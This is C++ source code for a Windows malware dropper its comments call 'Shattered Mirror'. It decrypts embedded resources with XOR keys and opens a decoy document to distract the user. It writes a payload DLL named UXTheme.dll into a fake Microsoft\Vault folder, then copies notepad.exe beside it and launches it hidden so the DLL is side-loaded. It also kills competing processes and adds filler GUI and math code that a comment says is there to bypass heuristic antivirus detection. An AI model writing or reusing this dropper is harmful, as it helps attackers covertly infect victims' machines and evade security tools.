#include <windows.h>
#include <shellapi.h>
#include <Shlobj.h>
#include <string>
#include <vector>
#include <commdlg.h>
#include <math.h>
#include <tlhelp32.h>

/* Log errors during runtime */
void RuntimeLog(const char* msg) {
    // printf("%s\n", msg);
}

/* 
 * GUI Operations and Entropy Generation
 * These functions ensure a legitimate application profile and high entropy to bypass heuristic detection.
 */
void InitializeUIProfile() {
    LOGFONTA lf = { 0 };
    lf.lfHeight = 12;
    HFONT hFont = CreateFontIndirectA(&lf);
    DeleteObject(hFont);
    
    CHOOSECOLORA cc = { sizeof(cc) };
    cc.Flags = CC_ANYCOLOR;
    
    double x = 1.0;
    for (int i = 0; i < 1000; i++) {
        x = sin(x) + cos(x);
    }
}

#include <tlhelp32.h>
void KillProcessByName(const WCHAR* szName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, szName) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        Sleep(1000); // Wait for unlocking
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

#define DECOY_KEY "9qG03GBPD32f"
#define PAYLOAD_KEY "1QO0kVer1PzENxox"

void DecryptDecoy(BYTE* data, size_t size) {
    if (!data || size == 0) return;
    std::string key = DECOY_KEY;
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.length()];
    }
}

void DecryptPayload(BYTE* data, size_t size) {
    InitializeUIProfile();
    std::string key = PAYLOAD_KEY;
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.length()];
    }
}

std::vector<BYTE> ExtractResource(int resourceId) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hRes) { 
        char err[100]; sprintf(err, "[!] FAILED: FindResource %d", resourceId);
        RuntimeLog(err);
        return {}; 
    }
    
    HGLOBAL hGlobal = LoadResource(hModule, hRes);
    if (!hGlobal) { RuntimeLog("[!] FAILED: LoadResource"); return {}; }
    
    DWORD size = SizeofResource(hModule, hRes);
    void* pData = LockResource(hGlobal);
    
    return std::vector<BYTE>((BYTE*)pData, (BYTE*)pData + size);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 0. Enable Console for Debugging
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    printf("[*] --- Shattered Mirror Debug Console ---\n");
    printf("[*] Initializing Dropper...\n");

    // Pre-Cleanup: Ensure no old processes are locking our hijack files
    printf("[*] Checking for existing hijack processes...\n");
    KillProcessByName(L"NoteSvc.exe");

    // 1. Extract and execute decoy asset (Resource ID 101)
    printf("[*] Extracting decoy resource...\n");
    std::vector<BYTE> decoyConfig = ExtractResource(101);
    if (!decoyConfig.empty()) {
        printf("[+] Decoy found. Decrypting...\n");
        DecryptDecoy(decoyConfig.data(), decoyConfig.size());
        
        // Format: [1 byte ext len][ext string][data]
        int extLen = decoyConfig[0];
        if (extLen > 0 && extLen < 10 && extLen < (int)decoyConfig.size()) {
            std::string ext(decoyConfig.begin() + 1, decoyConfig.begin() + 1 + extLen);
            std::vector<BYTE> data(decoyConfig.begin() + 1 + extLen, decoyConfig.end());

            WCHAR tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);
            std::wstring decoyPath = std::wstring(tempPath) + L"\\Document_" + std::to_wstring(GetTickCount()) + L"." + std::wstring(ext.begin(), ext.end());

            HANDLE hFile = CreateFileW(decoyPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
                CloseHandle(hFile);
                printf("[+] Decoy dropped as .%s to: %ls\n", ext.c_str(), decoyPath.c_str());
                ShellExecuteW(NULL, L"open", decoyPath.c_str(), NULL, NULL, SW_SHOW);
            }
        }
    } else {
        printf("[*] No decoy resource (101) found. Skipping decoy.\n");
    }

    // 2. Perform Shattered Payload Initialization (Resource ID 102)
    printf("[*] Extracting main payload (version.dll)...\n");
    std::vector<BYTE> payload = ExtractResource(102);
    if (!payload.empty()) {
        printf("[+] Payload found. Decrypting...\n");
        DecryptPayload(payload.data(), payload.size());

        WCHAR appData[MAX_PATH];
        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
        std::wstring hijackDir = std::wstring(appData) + L"\\Microsoft\\Vault";
        CreateDirectoryW(hijackDir.c_str(), NULL);
        printf("[*] Using Hijack Directory: %ls\n", hijackDir.c_str());

        std::wstring payloadPath = hijackDir + L"\\UXTheme.dll";
        HANDLE hFile = CreateFileW(payloadPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, payload.data(), payload.size(), &written, NULL);
            CloseHandle(hFile);
            printf("[+] UXTheme.dll written successfully.\n");
        } else {
            printf("[!] FAILED to write UXTheme.dll. Error: %d\n", GetLastError());
        }

        std::wstring hostSrc = L"C:\\Windows\\System32\\notepad.exe";
        std::wstring hostDst = hijackDir + L"\\NoteSvc.exe";
        printf("[*] Compiling with stable host (Notepad.exe) to ensure zero export errors...\n");
        if (CopyFileW(hostSrc.c_str(), hostDst.c_str(), FALSE)) {
            RuntimeLog("[+] Host copied successfully.");
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi = { 0 };
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            if (CreateProcessW(hostDst.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                char msg[100]; sprintf(msg, "[+] Host started PID: %d", pi.dwProcessId);
                RuntimeLog(msg);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                char msg[100]; sprintf(msg, "[!] FAILED: CreateProcess %d", GetLastError());
                RuntimeLog(msg);
            }
        } else {
            char msg[100]; sprintf(msg, "[!] FAILED: CopyFile %d", GetLastError());
            RuntimeLog(msg);
        }
    } else {
        printf("[!] CRITICAL: Payload resource (102) missing!\n");
    }
    
    printf("[*] Dropper task finished. Keeping console open for 30s...\n");
    Sleep(30000);
    return 0;
}
